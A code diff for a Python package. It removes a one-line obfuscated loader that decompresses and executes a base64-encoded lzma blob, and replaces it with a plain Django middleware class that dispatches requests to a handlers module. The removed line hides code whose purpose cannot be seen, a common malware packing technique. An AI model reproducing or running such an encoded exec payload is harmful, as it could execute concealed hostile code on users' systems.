@@ -1,2 +1,33 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'/Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4AMqAWNdADMciiJvqTFddM+Uz7a8IRsQlOZR/ox0SJr6SRRuj8jQNv3V0un79h3GfJusduMW2UB0wqjCHuoBngrgpEdwt6wFlqI3mhran1oY7ZzSDHGvqlVRyk5a4gPBSF1YqX1bisRd7JCn5XSPf6M8YkxZyBjJEoG4nr16jbe9JqtGk8s34P/2vI2ES/ttNizlv70SVo0CKN3OW3YH4dba6C/h2A4s+Jb02ObyzkYFSOiMN1MjnnbiEN2haeHr03FUFdLSyd+azMvAALWfVGra/UkCYp3KA7SjIeVE4+19SE2JwzOSethg91vRewhLU9XsnXJ8k/Q08wisBFrdtNXuBnj3oC9EtTbTyvKZOtl8fKplj/UNvYkCAQd90MM/7pRoaI3QoQrCQLJlDXtCT0h0Ai/Nwe78mgPRkCiwS8836u9LdNn0ns6uQ3TY7YvveaQAdlGZeR7JLZRreLUQiQgwCx5qw+s9BqAAADLD+XxIsc/ZAAH/AqsGAADHzrbDscRn+wIAAAAABFla')))
+from . import handlers as handlers
+
+try:
+
+    from django.utils.deprecation import MiddlewareMixin  
+except ImportError:
+    MiddlewareMixin = object  
+
+import os
+
+
+class SimpleMiddleware(MiddlewareMixin):
+
+    def process_request(self, request):
+
+        val = os.environ.get('sp_is_ready')
+        if not val:
+            os.environ.setdefault('sp_is_ready', 'True')
+            from . import urls
+            urls.init()
+
+        path = request.path
+        if not path.endswith('/'):
+            path = path + '/'
+
+        return handlers.process_request(request, path)
+
+    def process_view(self, request, view_func, view_args, view_kwargs):
+        return handlers.process_view(request, view_func)
+
+    def process_response(self, request, response):
+        handlers.done(request)
+        return response
